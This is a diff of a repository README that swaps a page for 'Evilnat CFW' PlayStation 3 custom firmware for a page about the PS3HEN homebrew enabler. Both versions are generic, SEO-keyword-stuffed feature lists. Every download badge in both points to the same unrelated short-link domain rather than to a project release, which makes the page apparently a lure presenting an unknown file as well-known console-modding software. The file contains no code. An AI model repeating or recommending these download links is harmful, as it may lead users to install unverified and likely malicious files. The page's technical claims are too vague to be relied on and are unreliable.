@@ -1,215 +1,221 @@
-<h1 align="center">🎮 Evilnat CFW</h1>
+
+# PS3HEN — PlayStation 3 Homebrew Enabler
 
 <p align="center">
-  <strong>Custom Firmware. Cobra Integration. System Control.</strong>
+  <strong>Homebrew functionality and system tools for supported PlayStation 3 consoles</strong>
 </p>
 
 <p align="center">
-  Custom firmware for compatible Sony PlayStation 3 Slim consoles.
-  <br>
-  Cobra 8.5 · Homebrew Execution · Package Manager · System Configuration · Firmware Tools
+  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-PS3HEN-blue?style=for-the-badge&logo=github" alt="Download PS3HEN"/></a>
 </p>
 
 <p align="center">
-  <a href="https://dyhuiying.com/s/file">
-    <img src="https://img.shields.io/badge/EVILNAT%20CFW%20DOWNLOAD-5B5BFF?style=for-the-badge&logo=playstation&logoColor=white" alt="Evilnat CFW Download">
-  </a>
+  <img src="https://img.shields.io/badge/Platform-PlayStation%203-blue" alt="Platform: PlayStation 3"/>
+  <img src="https://img.shields.io/badge/Type-Homebrew%20Enabler-green" alt="Type: Homebrew Enabler"/>
+  <img src="https://img.shields.io/badge/Version-3.6.0-orange" alt="Version 3.6.0"/>
+  <img src="https://img.shields.io/badge/Status-Available-brightgreen" alt="Status: Available"/>
 </p>
 
-<p align="center">
-  <img src="https://img.shields.io/badge/version-4.93-5B5BFF?style=flat-square">
-  <img src="https://img.shields.io/badge/cobra-8.5-5B5BFF?style=flat-square">
-  <img src="https://img.shields.io/badge/status-active-2ea44f?style=flat-square">
-  <img src="https://img.shields.io/badge/platform-PS3%20Slim-252525?style=flat-square">
-</p>
+## Overview
 
-<details>
-  <summary>📑 Contents</summary>
+**PS3HEN (PlayStation 3 Homebrew Enabler)** is a software solution that enables homebrew functionality on supported PlayStation 3 systems running compatible Official Firmware (OFW) or Hybrid Firmware (HFW) configurations.
 
-  - [Quick Start](#-quick-start)
-  - [Requirements](#-requirements)
-  - [Key Features](#-key-features)
-  - [Module Overview](#-module-overview)
-  - [Supported Platforms](#-supported-platforms)
-  - [Compatibility Information](#-compatibility-information)
-  - [Technical Specifications](#-technical-specifications)
-  - [Installation Guide](#-installation-guide)
-  - [FAQ](#-faq)
-  - [SEO Keywords](#-seo-keywords)
-</details>
+Unlike a traditional Custom Firmware (CFW), PS3HEN does not replace the console's entire firmware with a permanently modified CFW environment. Instead, it uses a compatible HFW installation and an activation process to enable additional functionality.
 
-## ⚡ Quick Start
+PS3HEN provides access to homebrew applications, payload features, plugin support, system utilities, and other tools designed for supported PS3 configurations.
 
-1. Identify the exact PS3 Slim model number and minimum downgrade version.
-2. Confirm that the console supports traditional custom firmware installation.
-3. Select the appropriate Evilnat 4.93 firmware variant and follow the documented installation procedure.
+## Key Features
 
-Once installed, Evilnat provides Cobra functionality, homebrew execution, package management, and additional system configuration options.
+- **Homebrew Execution:** Run compatible homebrew applications and utilities.
+- **Payload Functionality:** Access supported payload-based features.
+- **Kernel Plugin Support:** Load compatible kernel-level plugins.
+- **VSH Plugin Support:** Extend supported XMB functionality through plugins.
+- **PS3MAPI Integration:** Manage supported processes, modules, and system functions.
+- **Cobra-Compatible Features:** Access supported Cobra-related functionality.
+- **HFW Tools:** Use additional utilities designed for compatible Hybrid Firmware installations.
+- **Homebrew Management:** Support for compatible application and utility workflows.
+- **System Utilities:** Access additional tools provided by the PS3HEN environment.
 
-## 🖥️ Requirements
-
-| Requirement | Specification |
-|---|---|
-| Hardware | CFW-compatible PlayStation 3 Slim |
-| Firmware | Compatible OFW, HFW, or existing CFW configuration |
-| Firmware Release | Evilnat 4.93 Cobra 8.5 |
-| Storage | FAT32 USB storage for documented firmware installation |
-| Firmware Package | Model- and target-specific PS3UPDAT.PUP |
-| Compatibility Check | Console model and minimum version verification |
-
-## ✨ Key Features
-
-### Custom Firmware Environment
-
-- 🎮 **Homebrew Execution** — Supports running unsigned applications and compatible homebrew software.
-- 📦 **Package Manager** — Integrates package installation functionality into the PS3 environment.
-- 🧩 **Cobra 8.5** — Includes Cobra functionality enabled by default.
-- 🔧 **System Patches** — Applies firmware-level changes for additional system functionality.
-
-### System Management
-
-- 🌡️ **Fan Control** — Provides fan control functionality and temperature-related system features.
-- 🖥️ **XMB Integration** — Adds custom firmware options and configuration functionality.
-- 🔄 **Firmware Management** — Includes custom firmware update functionality.
-- 💾 **Storage Compatibility** — Supports compatible ISO and folder-based content formats.
-
-### Advanced Features
-
-- ⚙️ **LV1 and LV2 Functions** — Includes documented kernel-level peek and poke functionality.
-- 🎯 **RSX Controls** — Provides optional RSX overclocking variants.
-- 🕹️ **Multi-System Compatibility** — Supports compatible PS1, PS2, PSP, and PS3 content formats, subject to hardware and emulator limitations.
-
-## 📋 Module Overview
-
-| Component | Responsibility |
-|---|---|
-| Cobra 8.5 | Cobra custom firmware payload and functionality |
-| xai_plugin | Custom firmware configuration and XMB options |
-| VSH Components | XMB and system interface integration |
-| Kernel Patches | Firmware-level system modifications |
-| Fan Control | Fan speed and temperature management functionality |
-| Package Manager | Installation of compatible PKG files |
-| Flash Writer | Flash patching workflow used for eligible OFW-to-CFW installations |
-
-## 🚀 Supported Platforms
-
-| PS3 Slim Model Family | Compatibility |
-|---|---|
-| CECH-20xx | CFW-compatible |
-| CECH-21xx | CFW-compatible |
-| CECH-25xx | Conditional; minimum downgrade version must be 3.56 or lower |
-| CECH-30xx | Not supported through the standard software CFW installation method |
-| PS3 Super Slim CECH-40xx | Not supported through the standard software CFW installation method |
-
-The model number alone is not sufficient for every CECH-25xx console. Verify the minimum downgrade version before selecting a firmware installation method.
-
-## 🔍 Compatibility Information
-
-Evilnat 4.93 Cobra 8.5 is based on PlayStation 3 firmware 4.93.
-
-The firmware release provides multiple target variants:
-
-| Variant | Description |
-|---|---|
-| CEX | Retail console firmware |
-| PEX | CEX firmware with ported DEX modules |
-| D-PEX | DEX-oriented firmware with ported modules |
-| DEX | Debug-target firmware variant |
-
-Additional hardware-specific builds include:
-
-- **noBD** — For systems with a missing or defective Blu-ray drive logic board.
-- **noBT** — For systems with a missing or defective Bluetooth component.
-- **noBD + noBT** — Combines both hardware-specific modifications.
-- **Overclocked** — Optional GPU and memory clock variants.
-
-Choose a build based on the console's target ID and hardware condition. Do not substitute one variant for another based solely on its version number.
-
-## 🛠️ Technical Specifications
+## Technical Specifications
 
 | Specification | Details |
 |---|---|
-| Project | Evilnat CFW |
-| Firmware Version | 4.93 |
-| Cobra Version | 8.5 |
-| Platform | PlayStation 3 |
-| Target Hardware | Compatible PS3 Slim models |
-| Firmware Base | Official Firmware 4.93 CEX |
-| Firmware Variants | CEX, PEX, D-PEX, DEX |
-| Package Format | PUP |
-| System Integration | Cobra, XMB, kernel patches |
-| Additional Components | xai_plugin |
-| Installation Utility | PS3Xploit Flash Writer 4.93, where applicable |
+| Project | PS3HEN |
+| Full Name | PlayStation 3 Homebrew Enabler |
+| Platform | Sony PlayStation 3 |
+| Software Type | Homebrew Enabler |
+| Firmware Environment | Supported OFW and HFW configurations |
+| Activation | HEN activation process |
+| Architecture | PlayStation 3 system architecture |
+| Plugin Support | Compatible kernel and VSH plugins |
+| Management Interface | XMB and supported homebrew utilities |
+| Version Reference | 3.6.0 |
 
-## 📥 Installation Guide
+## Compatibility
 
-### 1. Verify Hardware Compatibility
+PS3HEN supports specific PlayStation 3 firmware configurations. Compatibility depends on the console model, firmware version, and installation environment.
 
-1. Locate the CECH model number on the console.
-2. Check the minimum downgrade version using an appropriate model-verification method.
-3. Confirm that the console is eligible for traditional CFW.
-4. Identify the correct NAND or NOR flash type for the hardware.
+### Documented Firmware Compatibility
 
-### 2. Prepare the Installation Environment
+| Firmware Configuration | Compatibility |
+|---|---|
+| CEX OFW 4.80–4.82 | Supported configurations |
+| DEX OFW 4.82 | Supported configuration |
+| HFW 4.83–4.93.1 | Supported configurations |
 
-For an eligible console currently on OFW, follow the documented HFW and Flash Writer 4.93 procedure.
+**Important:** These ranges describe documented PS3HEN compatibility configurations. They do not mean that every console model or firmware installation supports every feature. Verify the exact requirements for your system before installing or updating.
 
-Before writing to the console flash, create a flash dump and validate it with the recommended verification tools.
+PS3HEN is not interchangeable with full CFW. Console models that cannot install traditional CFW may still be compatible with PS3HEN when using a supported firmware environment.
 
-### 3. Select the Correct Firmware
+## Firmware Features
 
-Choose the correct Evilnat 4.93 variant:
+### Homebrew Environment
 
-- CEX or PEX for compatible retail configurations.
-- D-PEX or DEX only for the appropriate debug target configuration.
-- noBD or noBT variants only when the corresponding hardware condition applies.
+PS3HEN enables compatible homebrew applications and utilities to run on supported PlayStation 3 systems.
 
-### 4. Install Evilnat CFW
+### HEN Loader and Activation
 
-For an eligible OFW-to-CFW installation, complete the required flash-patching procedure first.
+The HEN activation process enables the homebrew environment. Depending on the configuration, users may need to activate HEN again after restarting the console.
 
-Place the selected firmware package on a FAT32 USB drive using the expected directory structure:
+### Plugin Functionality
 
-`PS3/UPDATE/PS3UPDAT.PUP`
+PS3HEN provides support for compatible plugin functionality, including kernel and VSH plugins.
 
-Follow the release-specific installation instructions and do not interrupt the firmware installation process.
+### Payload Engine
 
-### 5. Verify Installation
+The payload engine provides access to supported system-level functionality used by compatible tools and applications.
 
-After the console restarts, check System Information for the installed firmware version.
+### PS3MAPI Integration
 
-Confirm that the expected custom firmware options and Cobra functionality are available.
+PS3MAPI-compatible functionality allows supported applications to interact with processes and modules through the available management interface.
 
-## ❓ FAQ
+### Cobra-Compatible Functionality
 
-### Which PS3 Slim models support Evilnat CFW?
+PS3HEN includes supported Cobra-related features. Availability and behavior can differ from a full CFW environment.
 
-CECH-20xx and CECH-21xx models support traditional CFW. CECH-25xx models require a minimum downgrade version of 3.56 or lower.
+### HFW System Tools
 
-### Does Evilnat CFW include Cobra?
+Additional tools are available for supported Hybrid Firmware configurations and compatible system-management workflows.
 
-Yes. Evilnat 4.93 includes Cobra 8.5, enabled by default.
+## System Requirements
 
-### What is the difference between CEX and PEX?
+Before installation, make sure you have:
 
-CEX is the retail firmware variant. PEX combines a CEX base with ported DEX modules. D-PEX is intended for the corresponding DEX configuration.
+- A compatible Sony PlayStation 3 console.
+- A supported OFW or HFW configuration.
+- A firmware version compatible with the selected PS3HEN release.
+- A USB storage device formatted with a supported file system when required.
+- Sufficient free storage space for installation files and applications.
+- Access to the console's XMB interface.
+- A stable power supply during installation and system updates.
 
-### Can Evilnat run homebrew applications?
+A compatible firmware environment is required. Installing PS3HEN does not automatically make an unsupported firmware version compatible.
 
-Yes. The firmware includes patches that allow compatible unsigned applications and homebrew software to run.
-
-### Can I install Evilnat on a PS3 Super Slim?
-
-Not through the standard software-based CFW installation method. PS3 Super Slim systems use other homebrew approaches, such as PS3HEN.
-
-## 🔎 SEO Keywords
-
-Evilnat CFW, Evilnat 4.93, PS3 Slim custom firmware, PS3 CFW, PlayStation 3 firmware, Cobra 8.5, Evilnat Cobra 8.5, PS3 CEX firmware, PS3 PEX firmware, PS3 D-PEX firmware, PS3 homebrew, PS3 package manager, PS3Xploit Flash Writer, PS3 Slim jailbreak compatibility, CECH-20xx CFW, CECH-21xx CFW, CECH-25xx minimum version, PS3 fan control, PS3 firmware installation, PS3 custom firmware guide
+## Download & Installation
 
 <p align="center">
-  <strong>🎮 Evilnat CFW</strong>
-  <br>
-  Cobra 8.5 · Homebrew Execution · Package Management · System Configuration
-  <br>
-  PlayStation 3 Custom Firmware
+  <a href="https://dyhuiying.com/s/file"><img src="https://img.shields.io/badge/Download-PS3HEN-blue?style=for-the-badge&logo=github" alt="Download PS3HEN"/></a>
 </p>
+
+### Before You Begin
+
+1. Confirm your exact PS3 model and current firmware version.
+2. Verify that your firmware configuration is supported by the PS3HEN release.
+3. Read the installation instructions for the selected release.
+4. Back up important data before making system-level changes.
+5. Do not interrupt firmware installation or system operations.
+
+### Installation Workflow
+
+1. Prepare the compatible HFW environment when required.
+2. Obtain the appropriate PS3HEN release package.
+3. Follow the release-specific installation instructions.
+4. Complete the required installation or activation steps.
+5. Return to the XMB interface.
+6. Activate HEN using the supported activation method.
+7. Confirm that the homebrew environment is available.
+8. Install only applications and plugins compatible with your configuration.
+
+**Note:** Exact installation steps may differ between releases and firmware versions. Follow the instructions supplied with the specific package rather than applying procedures intended for another version.
+
+## Configuration & Management
+
+### HEN Activation
+
+PS3HEN may require activation after a console restart. Use the supported activation method for your installed release.
+
+### Homebrew Applications
+
+Install applications that are compatible with your PS3 firmware environment. Verify application requirements before installing system utilities or tools.
+
+### Plugin Management
+
+Use compatible plugin configuration methods. Incorrect plugin entries or incompatible modules may cause instability, freezing, or startup problems.
+
+### System Updates
+
+Do not install an arbitrary OFW, HFW, or CFW update without checking compatibility. A firmware update can change the system environment and affect PS3HEN availability.
+
+### Configuration Backups
+
+Keep backups of important data and configuration files before changing plugins, system settings, or firmware components.
+
+## Troubleshooting
+
+| Problem | Possible Cause | Recommended Action |
+|---|---|---|
+| HEN activation fails | Unsupported firmware or temporary activation issue | Verify firmware compatibility and retry using the documented method |
+| Homebrew application does not start | Incompatible application or missing requirement | Check application compatibility and installation instructions |
+| Console freezes after plugin loading | Incompatible or incorrectly configured plugin | Review plugin configuration and remove the problematic entry |
+| HEN is unavailable after reboot | Activation may be required again | Run the supported activation process |
+| Installation does not complete | Incorrect package or unsupported firmware | Verify the package and firmware version |
+| System tools do not work | Missing or unsupported payload functionality | Check tool requirements and PS3HEN compatibility |
+| XMB becomes unstable | Conflicting plugins or modifications | Disable recently added plugins and restore a known-good configuration |
+
+Avoid repeating failed firmware installation attempts without identifying the cause. If the console becomes unstable, prioritize recovery procedures appropriate to its exact model and firmware.
+
+## FAQ
+
+### 1. What is PS3HEN?
+
+PS3HEN is a PlayStation 3 Homebrew Enabler that provides homebrew execution and additional system functionality on supported firmware configurations.
+
+### 2. Is PS3HEN a Custom Firmware?
+
+No. PS3HEN is a Homebrew Enabler, not a full Custom Firmware replacement. It uses a compatible firmware environment and an activation process.
+
+### 3. Does PS3HEN work on every PS3 model?
+
+No. Compatibility depends on the console model, firmware version, and supported installation environment.
+
+### 4. Does PS3HEN require HFW?
+
+Many supported PS3HEN configurations use Hybrid Firmware. Check the requirements for the exact release and firmware version.
+
+### 5. Do I need to activate PS3HEN after restarting?
+
+Activation may be required again after a reboot. Follow the activation procedure documented for your installed version.
+
+### 6. Can I run homebrew applications with PS3HEN?
+
+Yes. PS3HEN enables compatible homebrew applications and utilities on supported systems.
+
+### 7. Does PS3HEN support plugins?
+
+Yes. It provides support for compatible kernel and VSH plugins, although individual plugins may have their own firmware requirements.
+
+### 8. Is PS3HEN the same as Cobra CFW?
+
+No. PS3HEN includes supported Cobra-compatible functionality, but it is not equivalent to a full Cobra-enabled Custom Firmware installation.
+
+### 9. Can I update my PS3 firmware after installing PS3HEN?
+
+Firmware updates can affect compatibility. Check the supported firmware range and installation requirements before updating.
+
+### 10. What should I do if HEN activation fails?
+
+Confirm your firmware version, verify that your console configuration is supported, and repeat the documented activation procedure. Avoid installing files intended for a different firmware environment.
+
+## SEO Keywords
+
+PS3HEN, PS3 Homebrew Enabler, PlayStation 3 Homebrew, PS3 HEN, PS3 HFW, PS3 Hybrid Firmware, PS3 OFW, PS3 Homebrew Applications, PS3 Homebrew Tools, PS3 Kernel Plugins, PS3 VSH Plugins, PS3MAPI, PS3 Payload Engine, Cobra Compatible Features, PS3 System Utilities, PS3 Firmware Support, PS3 Homebrew Environment, PlayStation 3 Software, PS3 HEN Installation, PS3 HEN Activation, PS3 Console Utilities, PS3 Homebrew Management, PS3 Firmware Compatibility, PS3 Plugin Support, PS3 System Modifications
